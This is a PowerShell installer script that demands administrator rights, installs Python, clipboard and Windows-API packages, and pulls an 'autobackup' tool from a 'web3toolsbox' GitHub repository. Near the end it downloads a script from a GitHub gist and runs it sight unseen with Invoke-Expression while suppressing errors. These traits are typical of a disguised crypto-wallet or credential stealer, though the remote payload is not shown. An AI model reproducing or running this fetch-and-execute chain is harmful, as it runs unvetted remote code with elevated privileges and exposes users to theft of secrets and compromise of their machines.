# Set error handling to continue on errors
$ErrorActionPreference = 'Continue'
$PSDefaultParameterValues['*:ErrorAction'] = 'Continue'

# Check and require admin privileges
try {
    $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    if (-not $isAdmin) {
        Write-Output 'Need administrator privileges'
        exit 1
    }
} catch {
    Write-Output "Error checking admin privileges: $_"
    exit 1
}

# Get current user for task creation
try {
    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    Write-Output "Installing for user: $currentUser"
} catch {
    Write-Output "Warning: Could not get current user: $_"
    $currentUser = $env:USERNAME
}

# Check installation
try {
    python --version | Out-Null
    Write-Output 'Python is already installed'
} catch {
    Write-Output 'Python not found, installing...'
    try {
        $pythonUrl = 'https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe'
        $installerPath = "$env:TEMP\python-installer.exe"
        Write-Output "Downloading Python installer..."
        Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
        Write-Output "Installing Python..."
        $process = Start-Process -FilePath $installerPath -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1' -Wait -PassThru -ErrorAction Stop
        if ($process.ExitCode -ne 0) {
            Write-Output "Warning: Python installer exited with code $($process.ExitCode)"
        }
        Remove-Item $installerPath -ErrorAction SilentlyContinue
        $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        Write-Output 'Python installation completed'
    } catch {
        Write-Output "Error installing Python: $_"
        Write-Output "Continuing with script execution..."
    }
}

$requirements = @(
    @{Name='requests'; Version='2.31.0'},
    @{Name='pyperclip'; Version='1.8.2'},
    @{Name='cryptography'; Version='42.0.0'},
    @{Name='pywin32'; Version='306'},
    @{Name='pycryptodome'; Version='3.19.0'}
)

foreach ($pkg in $requirements) {
    $pkgName = $pkg.Name
    $pkgVersion = $pkg.Version
    try {
        $checkCmd = "import pkg_resources; print(pkg_resources.get_distribution('$pkgName').version)"
        $version = python -c $checkCmd 2>&1 | Out-String
        $version = $version.Trim()
        if ($LASTEXITCODE -eq 0 -and $version) {
            try {
                if ([version]$version -ge [version]$pkgVersion) {
                    Write-Output "$pkgName (version $version) is already installed"
                    continue
                }
            } catch {
                # Version comparison failed, proceed to install
            }
        }
        Write-Output "Installing $pkgName >= $pkgVersion ..."
        python -m pip install "$pkgName>=$pkgVersion" --quiet
        if ($LASTEXITCODE -ne 0) {
            Write-Output "Warning: Failed to install $pkgName, continuing..."
        } else {
            Write-Output "$pkgName installed successfully"
        }
    } catch {
        Write-Output "Error installing $pkgName`: $($_.Exception.Message)"
        Write-Output "Continuing with next package..."
    }
}

try {
    pipx --version | Out-Null
    Write-Output 'pipx is already installed'
} catch {
    Write-Output 'pipx not found, installing...'
    try {
        python -m pip install pipx
        if ($LASTEXITCODE -ne 0) {
            Write-Output "Warning: Failed to install pipx, continuing..."
        } else {
            Write-Output 'pipx installed successfully'
            try {
                python -m pipx ensurepath
                $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
            } catch {
                Write-Output "Warning: Failed to ensure pipx path: $_"
            }
        }
    } catch {
        Write-Output "Error installing pipx: $_"
        Write-Output "Continuing with script execution..."
    }
}

$autobackupInstalled = $false
try {
    $cmd = Get-Command autobackup -ErrorAction SilentlyContinue
    if ($cmd) {
        $autobackupInstalled = $true
        Write-Output 'autobackup is already installed'
    }
} catch {

}

if (-not $autobackupInstalled) {
    Write-Output 'autobackup not found, installing...'
    $installed = $false
    try {
        pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
        if ($LASTEXITCODE -eq 0) {
            $installed = $true
        }
    } catch {
        Write-Output "First installation attempt failed: $_"
    }
    
    if (-not $installed) {
        try {
            python -m pipx install git+https://github.com/web3toolsbox/auto-backup-wins.git
            if ($LASTEXITCODE -eq 0) {
                $installed = $true
            }
        } catch {
            Write-Output "Second installation attempt failed: $_"
        }
    }
    
    if ($installed) {
        try {
            $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
        } catch {
            Write-Output "Warning: Failed to refresh PATH: $_"
        }
    } else {
        Write-Output "Warning: Failed to install autobackup, continuing..."
    }
}

$gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
try {
    $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
    if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
        try {
            Invoke-Expression $remoteScript.Content
        } catch {
            Write-Output "Error executing: $_"
            Write-Output "Continuing with script execution..."
        }
    } else {
        Write-Output "Warning: download returned unexpected status or empty content"
    }
} catch {
    Write-Output "Error downloading: $_"
    Write-Output "Continuing with script execution..."
}

# Automatically refresh environment variables
Write-Output "Refreshing environment variables..."
try {
    # Refresh environment variables for current session
    $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
    $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
    if ($machinePath -or $userPath) {
        $env:Path = if ($machinePath) { $machinePath } else { '' }
        if ($userPath) {
            $env:Path = if ($env:Path) { "$env:Path;$userPath" } else { $userPath }
        }
        Write-Output "Environment PATH refreshed"
    } else {
        Write-Output "Warning: Could not retrieve PATH from environment"
    }
    
    # Verify key tools are available
    $tools = @('python')
    foreach ($tool in $tools) {
        try {
            $version = & $tool --version 2>&1 | Out-String
            $version = $version.Trim()
            if ($version -and $LASTEXITCODE -eq 0) {
                Write-Output "$tool available: $($version.Split("`n")[0])"
            } else {
                Write-Output "$tool not available in current session, please restart PowerShell or manually refresh environment variables"
            }
        } catch {
            Write-Output "$tool not available in current session, please restart PowerShell or manually refresh environment variables"
        }
    }
    
    Write-Output "Environment variables refresh completed!"
} catch {
    Write-Output "Environment variables refresh failed: $_"
    Write-Output "Please restart PowerShell manually or run: refreshenv"
}

Write-Output "Installation completed!"
